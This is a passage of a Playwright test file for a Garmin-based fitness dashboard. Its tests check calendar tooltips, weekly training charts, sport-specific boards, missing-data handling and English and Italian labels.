    expect(values.every((v) => /^\d+\.\d\d$/.test(v ?? ""))).toBe(true);
    // the data starts 21 days before the end: a part of the 28 days would count as rest
    const short = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, prevStart: "2026-10-05" } }),
    );
    expect(await ratios(short.page)).toEqual(["n/a", "n/a"]);
  });

  it("shows a calendar day with its activities on hover", async () => {
    const { page } = await open(browser, pageFile());
    await page.hover("[data-date='2026-10-17']");
    const tip = await page.textContent(".cal-tip");
    expect(tip).toContain("Riverside Half Marathon");
    expect(await page.isVisible(".cal-tip")).toBe(true);
  });

  it.each([
    [1280, 800, "start"],
    [1280, 800, "center"],
    [1280, 800, "end"],
    [390, 844, "start"],
    [390, 844, "center"],
    [390, 844, "end"],
  ] as const)(
    "keeps every calendar tip in the viewport at %ix%i with the cell at %s",
    async (width, height, block) => {
      const { page } = await open(browser, pageFile(), { viewport: { width, height } });
      expect(await badTipDates(page, block)).toEqual([]);
    },
  );

  it("keeps the calendar tip of a day with five activities in the viewport", async () => {
    const busy = [1, 2, 3, 4, 5].map((i) => row(9300 + i, `Busy day ${i}`, "2026-10-20 07:00:00"));
    const { page } = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, activities: [...data.activities, ...busy] },
      }),
      { viewport: { width: 390, height: 844 } },
    );
    expect(await badTipDates(page, "end", "2026-10-20")).toEqual([]);
    await page.focus("[data-date='2026-10-20']");
    expect(await page.textContent(".cal-tip")).toContain("Busy day 5");
  });

  it("has no ancestor of the calendar tip that makes a containing block or a stacking context", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    await page.focus("[data-date='2026-10-17']");
    const bad = await page.evaluate(() => {
      const found: string[] = [];
      for (let n = document.querySelector(".cal-tip")!.parentElement; n; n = n.parentElement) {
        const c = getComputedStyle(n);
        const stacks = c.position !== "static" && c.zIndex !== "auto";
        if (
          c.transform !== "none" ||
          c.filter !== "none" ||
          c.perspective !== "none" ||
          c.contain !== "none" ||
          stacks
        )
          found.push(n.className || n.tagName);
      }
      return found;
    });
    expect(bad).toEqual([]);
  });

  it("shows the calendar tip on keyboard focus and hides it on blur", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    await page.focus("[data-date='2026-10-17']");
    expect(await page.isVisible(".cal-tip")).toBe(true);
    await page.evaluate(() => (document.activeElement as HTMLElement).blur());
    expect(await page.isVisible(".cal-tip")).toBe(false);
  });

  it("moves the calendar tip with its cell when the page scrolls", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    const cell = "[data-date='2026-10-17']";
    await page.focus(cell);
    await page.evaluate(() => window.scrollBy(0, 40));
    await frames(page);
    expect(followsCell(await tipGaps(page, cell))).toBe(true);
    await page.evaluate(() => (document.activeElement as HTMLElement).blur());
    await page.evaluate(() => window.scrollBy(0, 40));
    await frames(page);
    expect(await page.isVisible(".cal-tip")).toBe(false);
  });

  it("moves the calendar tip with its cell when the tile body scrolls", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    await page.addStyleTag({
      content: "[data-id=calendar] .tile-body { height: 100px; overflow-y: auto; }",
    });
    const cell = "[data-date='2026-10-17']";
    await page.focus(cell);
    // let the scroll that the focus caused end: it must not stand in for the box scroll
    await frames(page);
    await page.evaluate(() => {
      document.querySelector("[data-id=calendar] .tile-body")!.scrollTop = 30;
    });
    await frames(page);
    expect(followsCell(await tipGaps(page, cell))).toBe(true);
  });

  it("leaves no scroll listener once the calendar tip is hidden", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    const before = await scrollListeners(page);
    await page.focus("[data-date='2026-10-17']");
    expect(await scrollListeners(page)).toBe(before + 1);
    await page.evaluate(() => (document.activeElement as HTMLElement).blur());
    await page.evaluate(() => window.scrollTo(0, 0));
    await frames(page);
    expect(await scrollListeners(page)).toBe(before);
  });

  it("leaves no scroll listener when the page redraws under the calendar tip", async () => {
    const file = pageFile({ settings: { languages: ["en", "it"] } });
    const { page } = await open(browser, file, { viewport: { width: 390, height: 844 } });
    const before = await scrollListeners(page);
    await page.hover("[data-date='2026-10-17']");
    expect(await page.isVisible(".cal-tip")).toBe(true);
    // the mouse stays on the cell, so no blur hides the tip before the redraw
    await page.evaluate(() => {
      (document.querySelector(".account") as HTMLDetailsElement).open = true;
    });
    await page.selectOption("#lang", "it");
    await frames(page);
    await page.evaluate(() => window.scrollTo(0, 0));
    await frames(page);
    expect(await scrollListeners(page)).toBe(before);
  });

  it("keeps the calendar tip inside a viewport too low for it", async () => {
    const busy = [1, 2, 3, 4, 5].map((i) => row(9300 + i, `Busy day ${i}`, "2026-10-20 07:00:00"));
    const { page } = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, activities: [...data.activities, ...busy] },
      }),
      { viewport: { width: 390, height: 120 } },
    );
    await page.focus("[data-date='2026-10-20']");
    // the scroll puts the cell in the viewport; the tip follows it
    await page.evaluate(() => {
      const top = document.querySelector("[data-date='2026-10-20']")!.getBoundingClientRect().top;
      window.scrollBy({ top: top - 20, behavior: "instant" });
    });
    await frames(page);
    const { height, view, top } = await page.evaluate(() => {
      const tip = document.querySelector<HTMLElement>(".cal-tip")!;
      return {
        height: tip.getBoundingClientRect().height,
        view: document.documentElement.clientHeight,
        top: tip.getBoundingClientRect().top,
      };
    });
    expect(height).toBeGreaterThan(view - 16);
    expect(top).toBe(8);
  });

  it("keeps the calendar tip inside a viewport too narrow for it", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 200, height: 844 } });
    await page.focus("[data-date='2026-10-17']");
    const { width, view, left } = await page.evaluate(() => {
      const tip = document.querySelector<HTMLElement>(".cal-tip")!;
      return {
        width: tip.getBoundingClientRect().width,
        view: document.documentElement.clientWidth,
        left: tip.getBoundingClientRect().left,
      };
    });
    expect(width).toBeGreaterThan(view - 16);
    expect(left).toBe(8);
  });

  it("keeps one tab stop in the calendar of an older window", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#all@2026-08-03_2026-08-31" });
    const stops = await page.$$eval("[data-id=calendar] .cal-cell[tabindex='0']", (c) =>
      c.map((x) => x.getAttribute("data-date")),
    );
    // the Sunday of the window's last week
    expect(stops).toEqual(["2026-09-06"]);
  });

  it("shows n/a without a unit for a missing distance", async () => {
    const swim = {
      id: 9200,
      name: "Open water, no distance",
      type: "open_water_swimming",
      sport: "swimming",
      start: "2026-10-24 07:00:00",
      duration: "30:00",
    };
    const { page } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: [swim, ...data.activities] } }),
      { hash: "#swimming" },
    );
    const cells = await page.$$eval("[data-id=swimDetails] tbody tr:first-child td", (c) =>
      c.map((x) => x.textContent),
    );
    expect(cells[2]).toBe("n/a");
    expect(cells[3]).toBe("n/a");
  });

  it("lists the activities, and opens and closes their laps", async () => {
    const { page } = await open(browser, pageFile());
    const rows = () =>
      page.$$eval(
        "[data-id=activities] table.data > tbody > tr:not(.laps-row):not([hidden])",
        (r) => r.length,
      );
    expect(await rows()).toBe(10);
    await page.click("text=Show all 75");
    expect(await rows()).toBe(75);
    // the browser keeps the choice
    await page.reload();
    await page.waitForSelector(".page");
    expect(await rows()).toBe(75);
    await page.click("text=Show fewer");
    expect(await rows()).toBe(10);
    const button = "[data-id=activities] button[aria-expanded]";
    await page.click(button);
    expect(await page.$$eval(".laps-row", (r) => r.length)).toBe(1);
    await page.click(`${button}[aria-expanded=true]`);
    expect(await page.$$eval(".laps-row", (r) => r.length)).toBe(0);
  });

  it("colours a change only when one direction is better", async () => {
    const { page } = await open(browser, pageFile());
    const deltas = await page.$$eval("[data-id=kpis] .delta", (els) =>
      els.map((e) => [e.className.trim(), e.textContent]),
    );
    // distance and time: an arrow, no colour; HRV: lower is worse, and says so
    expect(deltas).toEqual([
      ["delta", "▼ 11%"],
      ["delta", "▲ 8%"],
      ["delta bad", "▼ 4% (worse)"],
    ]);
    // "Normal" readiness is no warning
    const color = (sel: string) => page.$eval(sel, (e) => getComputedStyle(e).color);
    expect(await color(".verdict-normal")).toBe(await color("h1"));
  });

  it("shows four records, and all of them on Show all", async () => {
    const { page } = await open(browser, pageFile());
    const shown = () =>
      page.$$eval("[data-id=records] .badge:not([hidden]) .kpi-label", (b) =>
        b.map((x) => x.textContent),
      );
    expect(await shown()).toEqual([
      "Fastest half marathon",
      "Longest session · Run",
      "Longest session · Bike",
      "Best est. 1RM · Barbell Back Squat",
    ]);
    await page.click("[data-id=records] >> text=Show all 19");
    expect(await shown()).toHaveLength(19);
    expect(await page.getAttribute("[data-id=records] .more", "aria-expanded")).toBe("true");
  });

  it("shows the fitness age components behind Details", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await page.isVisible("[data-id=fitnessAge] table")).toBe(false);
    await page.click("[data-id=fitnessAge] summary");
    expect(await page.isVisible("[data-id=fitnessAge] table")).toBe(true);
  });

  it("switches the weekly volume between time, distance, sessions and load", async () => {
    const { page } = await open(browser, pageFile());
    const axis = () =>
      page.evaluate(() => {
        const c = Object.values(window.Chart!.instances).find((x) =>
          x.canvas.closest("[data-id=weeklyVolume]"),
        )!;
        return (c.options.scales!.y as { title: { text: string } }).title.text;
      });
    expect(await axis()).toBe("h");
    await page.click("[data-id=weeklyVolume] .picker >> text=Distance");
    expect(await axis()).toBe("km");
  });

  describe("a week without a distance or a load in the weekly charts", () => {
    // indoor rides: week -5 has a distance and a load, week -4 has neither, week -3 has both, then two empty weeks
    const rides = [
      bikeRide("2026-09-29", { km: 30, trainingLoad: 50 }),
      bikeRide("2026-10-06"),
      bikeRide("2026-10-07"),
      bikeRide("2026-10-13", { km: 10, trainingLoad: 40 }),
    ];
    const weeklyPage = (tab = "") =>
      open(browser, pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: rides } }), {
        hash: tab,
      });
    it("leaves a gap on Distance, and the average line skips it", async () => {
      const { page, errors } = await weeklyPage();
      await page.click("[data-id=weeklyVolume] .picker >> text=Distance");
      const { bars, avg } = await lastWeeks(page, "weeklyVolume", "Bike");
      expect(bars).toEqual([30, null, 10, 0, 0]);
      // the mean of the known weeks of the last 4: a gap is not a 0, an empty week is
      expect(avg[1]).toBe(10);
      expect(avg[2]).toBeCloseTo(40 / 3, 5);
      expect(avg[3]).toBeCloseTo(40 / 3, 5);
      expect(avg[4]).toBeCloseTo(10 / 3, 5);
      expect(errors).toEqual([]);
    });

    it("counts the time of every week", async () => {
      const { page } = await weeklyPage();
      const { bars } = await lastWeeks(page, "weeklyVolume", "Bike");
      expect(bars).toEqual([0.5, 1, 0.5, 0, 0]);
    });

    it("leaves a gap on Load for sessions without a load or a heart rate", async () => {
      const { page } = await weeklyPage();
      await page.click("[data-id=weeklyVolume] .picker >> text=Load");
      const { bars } = await lastWeeks(page, "weeklyVolume", "Bike");
      expect(bars).toEqual([50, null, 40, 0, 0]);
    });

    it("leaves the same gap in Each week on the Cycling board", async () => {
      const { page, errors } = await weeklyPage("#cycling");
      await page.click("[data-id=typeWeekly] .picker >> text=Distance");
      const { bars } = await lastWeeks(page, "typeWeekly", "Bike");
      expect(bars).toEqual([30, null, 10, 0, 0]);
      expect(errors).toEqual([]);
    });
  });

  describe("a week without a load in the Load safety chart", () => {
    it("leaves a gap in the bars for sessions without a load, and an empty week is 0", async () => {
      const { bars } = await loadSafety([
        bikeRide("2026-09-29", { trainingLoad: 50 }),
        bikeRide("2026-10-06"),
        bikeRide("2026-10-13", { trainingLoad: 40 }),
      ]);
      expect(bars).toEqual([50, null, 40, 0, 0]);
    });

    it("has no ramp for the gap and none for the week after it", async () => {
      const { ramp } = await loadSafety([
        bikeRide("2026-09-29", { trainingLoad: 50 }),
        bikeRide("2026-10-06"),
        bikeRide("2026-10-13", { trainingLoad: 40 }),
        bikeRide("2026-10-20", { trainingLoad: 40 }),
      ]);
      // week 10-05 is the gap and 10-12 comes after it: neither has a ramp, and none is -100;
      // 10-19 is 40 against 40; the week in progress has none
      expect(ramp).toEqual([null, null, null, 0, null]);
    });

    it("flags the same weeks with a gap as without", async () => {
      const gap = await loadSafety([
        bikeRide("2026-09-29", { trainingLoad: 20 }),
        bikeRide("2026-10-06", { trainingLoad: 100 }),
        bikeRide("2026-10-13"),
        bikeRide("2026-10-20", { trainingLoad: 100 }),
      ]);
      expect(gap.bars).toEqual([20, 100, null, 100, 0]);
      expect(gap.ramp).toEqual([null, 400, null, null, null]);
      // only the rise from 20 to 100 is flagged, not the week after the gap
      expect(gap.flagged).toBe("1");
      const zero = await loadSafety([
        bikeRide("2026-09-29", { trainingLoad: 20 }),
        bikeRide("2026-10-06", { trainingLoad: 100 }),
        bikeRide("2026-10-20", { trainingLoad: 100 }),
      ]);
      expect(zero.bars).toEqual([20, 100, 0, 100, 0]);
      expect(zero.ramp).toEqual([null, 400, -100, null, null]);
      expect(zero.flagged).toBe("1");
    });

    it("keeps -100% for an empty week after a load: that drop is real", async () => {
      const { bars, ramp } = await loadSafety([bikeRide("2026-10-13", { trainingLoad: 40 })]);
      expect(bars).toEqual([0, 0, 40, 0, 0]);
      expect(ramp).toEqual([null, null, null, -100, null]);
    });
  });

  it("shows the widgets in Italian", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ settings: { languages: ["en", "it"] } }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("[data-id=readiness] h2")).toBe("Prontezza di oggi");
    expect(await page.textContent(".totals")).toContain("sessioni");
    expect(errors).toEqual([]);
  });
});

describe("type boards", () => {
  it("draws every board without errors, with a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, pageFile());
    for (const tab of ["recovery", "running", "strengthTraining", "walking", "cycling", "racket"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await chartsWithoutTooltip(page)]).toEqual([tab, []]);
    }
    expect(errors).toEqual([]);
  });

  it("has a Recovery board with one note for its 14-day widgets", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await tiles(page)).toEqual([
      "readiness",
      "fitnessAge",
      "loadVsRecovery",
      "hrv",
      "restingHr",
      "sleep",
      "sleepNeed",
      "bedtime",
      "bodyBattery",
      "stress",
    ]);
    expect(await page.textContent(".board-note")).toContain("last 14 days");
    expect(await page.$$eval(".tile .note", (els) => els.map((e) => e.textContent))).not.toContain(
      "Last 14 days: the week window does not change it.",
    );
  });

  it("fits every board on a phone", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    for (const tab of ["all", "running", "strengthTraining", "walking", "cycling", "racket"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([
        tab,
        await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
      ]).toEqual([tab, true]);
    }
  });

  it("shows the Run widgets", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#running" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "races",
      "racePredictor",
      "aerobicFitness",
      "bestEfforts",
      "trainingEffect",
      "intensityShare",
      "runningForm",
      "longRuns",
      "runWalk",
      "activities",
    ]);
    const races = await page.$$eval("[data-id=races] tbody tr", (r) =>
      r.map((x) => x.children[1].textContent),
    );
    expect(races).toEqual(["Riverside Half Marathon", "City 10K"]);
    expect(await page.$$eval("[data-id=racePredictor] .kpi", (k) => k.length)).toBe(4);
    expect(await page.textContent("[data-id=racePredictor]")).toContain("Estimate (Riegel)");
    // a small multiple for each running form metric in the data
    expect(await page.$$eval("[data-id=runningForm] .multiple", (m) => m.length)).toBe(7);
    // the efficiency of the aerobic runs, last 4 weeks against the first 4
    expect(await page.textContent("[data-id=aerobicFitness] .kpi-label")).toBe(
      "Aerobic-run efficiency · last 4 weeks",
    );
    expect(await page.textContent("[data-id=aerobicFitness] .kpi-value")).toMatch(/^\d\.\d\d$/);
    expect(await page.textContent("[data-id=aerobicFitness] .kpi-sub")).toContain(
      "vs first 4 weeks",
    );
    // the 5 km and 10 km of each run over time
    expect(
      await page.$$eval("[data-id=bestEfforts] .sr-only thead th", (h) =>
        h.map((x) => x.textContent),
      ),
    ).toEqual(["5 km", "10 km"]);
    // the newest best of each distance, not the first effort of the window
    expect(
      await page.$$eval("[data-id=bestEfforts] table.data tbody tr", (r) =>
        r.map((x) => [...x.children].map((c) => c.textContent)),
      ),
    ).toEqual([
      ["1 km", "4:36", "Oct 17 · Riverside Half Marathon"],
      ["mile", "7:25", "Oct 17 · Riverside Half Marathon"],
      ["5 km", "23:02", "Oct 17 · Riverside Half Marathon"],
      ["10 km", "46:05", "Oct 17 · Riverside Half Marathon"],
      ["half marathon", "1:37:13", "Oct 17 · Riverside Half Marathon"],
    ]);
    // the laps of the fixture have HR, so every long run has a drift
    const drift = await page.$$eval("[data-id=longRuns] table.data tbody tr", (r) =>
      r.map((x) => x.children[5].textContent),
    );
    expect(drift.length).toBeGreaterThan(0);
    for (const d of drift) expect(d).toMatch(/^-?\d+\.\d%$/);
    // every run of the fixture has Garmin's zone time
    expect(await page.textContent("[data-id=intensityShare]")).not.toContain("Approximate");
  });

  it("shows n/a for a race without time or pace, gaps for weeks without ascent, and the approximate-zones note", async () => {
    const gaps = {
      ...data,
      activities: data.activities.map((a: Record<string, unknown>) => ({
        ...a,
        // only the runs of the last week give an ascent, and it is a real 0 m
        ascentM: String(a.start) >= "2026-10-19" ? 0 : undefined,
        // one run of that week has no zone time from Garmin, the others have it
        ...(String(a.start).startsWith("2026-10-22") ? { hrZonesSec: undefined } : {}),
        ...(a.name === "Riverside Half Marathon" ? { duration: undefined } : {}),
        ...(a.name === "City 10K" ? { pace: undefined } : {}),
      })),
      v: DASHBOARD_VERSION,
      notes: [],
    };
    const { page, errors } = await open(browser, pageFile({ data: gaps }), { hash: "#running" });
    const races = await page.$$eval("[data-id=races] tbody tr", (r) =>
      r.map((x) => [
        x.children[1].textContent,
        x.children[3].textContent,
        x.children[4].textContent,
      ]),
    );
    expect(races).toEqual([
      ["Riverside Half Marathon", "n/a", "4:48/km"],
      ["City 10K", "49:00", "n/a"],
    ]);
    const ascent = await chartDataset(page, "longRuns", "Weekly ascent");
    // 13 weeks: no ascent in the first 11, 0 m in the 12th, no run in the 13th
    expect(ascent).toEqual({
      data: [...Array.from({ length: 11 }, () => null), 0, null],
      spanGaps: true,
    });
    expect(await page.textContent("[data-id=intensityShare]")).toContain("Approximate");
    expect(errors).toEqual([]);
  });

  it("shows n/a for the cycling ascent without ascent data, and keeps a real 0", async () => {
    const base = without(
      data.activities.find((a: Record<string, unknown>) => a.type === "cycling"),
      ["ascentM"],
    );
    const ride = (n: number, start: string, ascentM?: number) => ({
      ...base,
      id: 900 + n,
      start: `${start} 09:00:00`,
      ...(ascentM === undefined ? {} : { ascentM }),
    });
    // week A: no ascent data; week B: a real 0 m; week C: 120 m and one ride without data
    const weekA = [ride(1, "2026-10-06"), ride(2, "2026-10-08")];
    const weekB = [ride(3, "2026-10-13", 0), indoorRide(4, "2026-10-15", 0)];
    const weekC = [ride(5, "2026-10-20", 120), ride(6, "2026-10-22")];
    expect((await cyclingAscent(weekA)).text).toBe("n/a");
    expect((await cyclingAscent(weekB)).text).toBe("0 m");
    const all = await cyclingAscent([...weekA, ...weekB, ...weekC]);
    expect(all.text).toBe("120 m");
    // 13 weeks: no ride in the first 9 and the 13th; A is a gap, B a real 0, C the known 120
    const bars = await chartDataset(all.page, "bikeDetails", "Weekly ascent");
    expect(bars.data).toEqual([...Array.from({ length: 10 }, () => null), 0, 120, null]);
  });

  it("shows n/a for the cycling distance without a distance, and keeps a real km", async () => {
    // no ride has a distance: n/a and no "vs 4 weeks" line
    expect(await distanceTile([indoorRide(1, "2026-10-20")])).toEqual({ value: "n/a", sub: 0 });
    // a real distance with nothing before it: no line, as no change can show
    expect(await distanceTile([indoorRide(2, "2026-10-20", 12)])).toEqual({
      value: "12.0 km",
      sub: 0,
    });
    // a ride in the 4 weeks before: the line
    const before = indoorRide(5, "2026-10-05", 12);
    expect(await distanceTile([indoorRide(2, "2026-10-20", 12), before])).toEqual({
      value: "24.0 km",
      sub: 1,
    });
    // one ride with and one without: the known km, and the line
    expect(
      await distanceTile([indoorRide(3, "2026-10-20", 12), indoorRide(4, "2026-10-21"), before]),
    ).toEqual({
      value: "24.0 km",
      sub: 1,
    });
  });

  it("shows n/a in the racket table for no zone time, and a real 0 for easy zones only", async () => {
    const base = data.activities.find((a: Record<string, unknown>) => a.type === "paddelball");
    const padel = (n: number, extra: Record<string, unknown>) => ({
      ...without(base, ["hrZonesSec", "avgHR"]),
      id: 700 + n,
      start: `2026-10-2${n} 20:00:00`,
      ...extra,
    });
    const rows = [
      padel(1, { hrZonesSec: [0, 0, 0, 0, 0] }),
      padel(2, { hrZonesSec: [600, 0, 600, 600, 600] }),
      padel(3, { hrZonesSec: [600, 0, 0, 0, 0] }),
      padel(4, {}),
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: rows } }),
      { hash: "#racket" },
    );
    const cells = await page.$$eval("[data-id=racketDetails] tbody tr", (r) =>
      r.map((x) => `${x.children[6].textContent}|${x.children[7].textContent}`),
    );
    expect(errors).toEqual([]);
    // the order of the rows does not matter here
    expect(cells.toSorted()).toEqual(["0 min|0%", "30 min|50%", "n/a|n/a", "n/a|n/a"]);
  });

  it("observes the tab bar once, however often the page is drawn again", async () => {
    const { page, errors } = await open(browser, pageFile(), {
      init: `(() => {
        const Native = window.ResizeObserver;
        const live = new Set();
        window.tabBars = () =>
          [...live].flatMap((o) => [...o.els]).filter((el) => el.matches('[role="tablist"]')).length;
        window.ResizeObserver = class extends Native {
          els = new Set();
          observe(el) { this.els.add(el); live.add(this); super.observe(el); }
          disconnect() { live.delete(this); super.disconnect(); }
        };
      })();`,
    });
    for (const tab of ["running", "strengthTraining", "cycling"]) {
      await page.click(`[data-tab=${tab}]`);
    }
    expect(
      await page.evaluate(() => (window as unknown as { tabBars: () => number }).tabBars()),
    ).toBe(1);
    expect(errors).toEqual([]);
  });

  it("shows the grit and flow of mountain-bike rides, ride after ride", async () => {
    const road = data.activities.find((a: Record<string, unknown>) => a.type === "cycling");
    const trail = (n: number, start: string, grit: number | undefined, flow: number) => ({
      ...road,
      id: 950 + n,
      type: "mountain_biking",
      name: "Hillside - Trail Loop",
      start: `${start} 09:00:00`,
      ...(grit === undefined ? {} : { grit }),
      flow,
    });
    // a ride with flow but no grit leaves a gap in the grit line, not a 0
    const rides = [
      trail(1, "2026-10-20", 30, 4.2),
      road,
      trail(3, "2026-10-13", undefined, 3.6),
      trail(2, "2026-10-06", 12.5, 3.1),
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: rides } }),
      { hash: "#cycling" },
    );
    const head = await page.$$eval("[data-id=bikeDetails] thead th", (c) =>
      c.map((x) => x.textContent),
    );
    expect(head.slice(-2)).toEqual(["Grit", "Flow"]);
    const roadRow = await page.$$eval("[data-id=bikeDetails] tbody tr", (r) =>
      r.map((x) => [...x.children].slice(-2).map((c) => c.textContent)),
    );
    expect(roadRow).toContainEqual(["n/a", "n/a"]);
    // oldest ride first; only the rides that have the value
    expect((await chartDataset(page, "bikeDetails", "Flow")).data).toEqual([3.1, 3.6, 4.2]);
    expect((await chartDataset(page, "bikeDetails", "Grit")).data).toEqual([12.5, null, 30]);
    expect(await page.innerText("[data-id=bikeDetails]")).toContain("lower is smoother");
    expect(errors).toEqual([]);
  });

  it("gives one mountain-bike ride its columns but no chart", async () => {
    const road = data.activities.find((a: Record<string, unknown>) => a.type === "cycling");
    const trail = { ...road, id: 960, type: "mountain_biking", grit: 20, flow: 3.5 };
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: [trail, road] } }),
      { hash: "#cycling" },
    );
    const head = await page.$$eval("[data-id=bikeDetails] thead th", (c) =>
      c.map((x) => x.textContent),
    );
    expect(head.slice(-2)).toEqual(["Grit", "Flow"]);
    expect(await page.locator("[data-id=bikeDetails] canvas").count()).toBe(1);
    expect(errors).toEqual([]);
  });

  it("has no grit and flow without mountain-bike data", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#cycling" });
    expect(await page.innerText("[data-id=bikeDetails]")).not.toMatch(/\bGrit\b|\bFlow\b/);
    expect(errors).toEqual([]);
  });

  it("names the training effects with the catalogue texts", async () => {
    // a label that the catalogues do not know keeps Garmin's words
    const unknown = {
      ...data,
      activities: data.activities.map((a: Record<string, unknown>) =>
        String(a.start).startsWith("2026-10-24") ? { ...a, teLabel: "lactate_threshold" } : a,
      ),
      v: DASHBOARD_VERSION,
      notes: [],
    };
    const en = await open(browser, pageFile({ data: unknown }), { hash: "#running" });
    expect((await barLabels(en.page, "trainingEffect")).toSorted()).toEqual([
      "Aerobic base",
      "Anaerobic capacity",
      "Tempo",
      "VO2 max",
      "lactate threshold",
    ]);
    const italian = await open(
      browser,
      pageFile({ data: unknown, settings: { languages: ["en", "it"] } }),
      { hash: "#running", locale: "it-IT" },
    );
    expect((await barLabels(italian.page, "trainingEffect")).toSorted()).toEqual([
      "Base aerobica",
      "Capacità anaerobica",
      "Tempo",
      "VO2 max",
      "lactate threshold",
    ]);
    expect([...en.errors, ...italian.errors]).toEqual([]);
  });

  describe("Garmin word", () => {
    it("shows the HRV status in English", async () => {
      expect((await hrvTile("BALANCED", ["en"], "HRV status")).tile).toEqual(["Balanced", null]);
    });

    it("shows the HRV status in Italian", async () => {
      expect((await hrvTile("BALANCED", ["it"], "Stato HRV")).tile).toEqual(["Bilanciato", null]);
    });

    it("shows an HRV status that the catalogue does not know with a space", async () => {
      expect((await hrvTile("NEW_STATUS", ["en"], "HRV status")).tile).toEqual([
        "NEW STATUS",
        null,
      ]);
    });

    it("translates LOW and UNBALANCED and keeps the verdict of the raw status", async () => {
      const low = await hrvTile("LOW", ["it"], "Stato HRV");
      expect(low.tile).toEqual(["Basso", null]);
      const lowEn = await hrvTile("LOW", ["en"], "HRV status");
      expect(lowEn.verdict).toBe(enTexts["ready.easy"]);
      const unbalanced = await hrvTile("UNBALANCED", ["it"], "Stato HRV");
      expect(unbalanced.tile).toEqual(["Sbilanciato", null]);
    });

    it("shows the lap types in Italian", async () => {
      const cells = await lapTypes(["it"]);
      expect(cells).toContain("Riscaldamento");
      expect(cells).toContain("Attivo");
      expect(cells).toContain("Intervallo");
    });

    it("shows the lap types in English", async () => {
      const cells = await lapTypes(["en"]);
      expect(cells).toContain("Warm-up");
      expect(cells).toContain("Active");
    });

    it("shows an empty cell for a lap without a type and a space for an unknown one", async () => {
      const cells = await lapTypes(["en"], [undefined, "cool_off"]);
      expect(cells.slice(0, 2)).toEqual(["", "cool off"]);
      expect(cells).not.toContain("undefined");
    });

    it("takes the title of the HRV axis from the catalogue", async () => {
      const { page, errors } = await open(
        browser,
        pageFile({ i18n: { it: { "lvr.hrv": "VFC (ms)" } }, settings: { languages: ["it"] } }),
      );
      const title = await page.evaluate(
        () =>
          (
            Object.values(window.Chart!.instances).find((c) =>
              c.canvas.closest("[data-widget=loadVsRecovery]"),
            )!.options.scales!.y1 as { title: { text: string } }
          ).title.text,
      );
      expect(title).toBe("VFC (ms)");
      expect(errors).toEqual([]);
    });
  });

  it("compares the same workout across weeks, up to 3 workouts, intervals by their work laps", async () => {
    // the Run board has the workout trend only when the page turns it on
    const { page, errors } = await open(browser, pageFile({ settings: { workouts: true } }), {
      hash: "#running",
    });
    expect(await tiles(page)).toContain("workoutTrend");
    const tile = "[data-id=workoutTrend]";
    const pressed = () =>
      page.$$eval(`${tile} [aria-pressed=true]`, (b) => b.map((x) => x.textContent));
    const kpis = () => page.$$eval(`${tile} .kpi-label`, (k) => k.map((x) => x.textContent));
    // the repeated run names only, with their session count; the first one and pace are chosen
    expect(
      await page.$$eval(`${tile} .chip`, (b) => b.slice(0, 4).map((x) => x.textContent)),
    ).toEqual(["Long Run (10)", "Track Intervals (6)", "Easy Run (12)", "Tempo Run (6)"]);
    expect(await pressed()).toEqual(["Long Run (10)", "Pace / speed"]);
    // all 10 sessions: the list ends at 10, so no "Show all"
    expect(await page.$$eval(`${tile} table.data tbody tr:not([hidden])`, (r) => r.length)).toBe(
      10,
    );
    expect(await page.$(`${tile} .btn.more`)).toBeNull();
    await page.click(`${tile} >> text=Track Intervals (6)`);
    expect(await kpis()).toEqual(["Long Run", "Track Intervals"]);
    await page.click(`${tile} >> text=Easy Run (12)`);
    await page.click(`${tile} >> text=Tempo Run (6)`);
    // a fourth workout replaces the first
    expect(await kpis()).toEqual(["Track Intervals", "Easy Run", "Tempo Run"]);
    // the table shows the sessions of the first workout: intervals with reps and fade
    expect(await page.textContent(`${tile} h3`)).toBe("Track Intervals");
    const head = await page.$$eval(`${tile} table.data th`, (h) => h.map((x) => x.textContent));
    expect(head.slice(-2)).toEqual(["Reps", "Fade"]);
    const reps = await page.$$eval(`${tile} table.data tbody tr`, (r) =>
      r.map((x) => x.children[x.children.length - 2].textContent),
    );
    expect(reps).toEqual(["7", "7", "7", "7", "7", "7"]);
    await page.click(`${tile} >> text=Avg HR`);
    expect(await page.textContent(`${tile} .kpi-value`)).toMatch(/^\d+ bpm$/);
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("groups the runs of one workout whatever place Garmin puts in their name", async () => {
    let n = 0;
    const activities = data.activities.map((a: { name: string }) =>
      a.name === "Tempo Run"
        ? { ...a, name: `${n++ % 2 ? "Hillview" : "Riverside"} - Tempo Run` }
        : a,
    );
    const { page } = await open(
      browser,
      pageFile({
        data: { ...data, activities, v: DASHBOARD_VERSION },
        settings: { workouts: true },
      }),
